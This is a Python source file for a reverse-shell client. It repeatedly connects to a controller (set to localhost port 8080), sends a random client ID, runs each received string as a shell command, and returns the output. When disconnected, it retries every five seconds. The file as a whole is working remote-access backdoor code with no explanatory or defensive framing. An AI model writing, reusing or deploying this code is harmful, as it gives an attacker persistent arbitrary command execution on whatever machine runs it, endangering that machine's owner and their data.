import socket
import subprocess
import time
import threading
import string
import random
import struct

def shell(s):
    while True:
        data = s.recv(1024)
        if data.decode("utf-8").strip() == 'exit':  # If received command is 'exit', break the loop and close connection
            break
        if data:  # if command is received
            print(f"Received command: {data.decode('utf-8')}")
            cmd = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
            output = cmd.stdout + cmd.stderr
            print(f"Sending output: {output}")
            len_buf = struct.pack('!I', len(output))
            s.sendall(len_buf + output)

server = 'localhost'
port = 8080
client_id = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=8))  # Generate a random 8-character ID

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((server, port))
        s.send((client_id + '\n').encode('utf-8'))  # Send the ID right after establishing the connection
        shell_thread = threading.Thread(target=shell, args=(s,))
        shell_thread.start()
        shell_thread.join()
        s.close()
        time.sleep(5)  # If connection was closed, wait for 5 seconds before trying to reconnect
    except socket.error as e:
        print(f"Connection failed: {str(e)}")
        time.sleep(5)  # If connection attempt failed, wait for 5 seconds before trying to reconnect
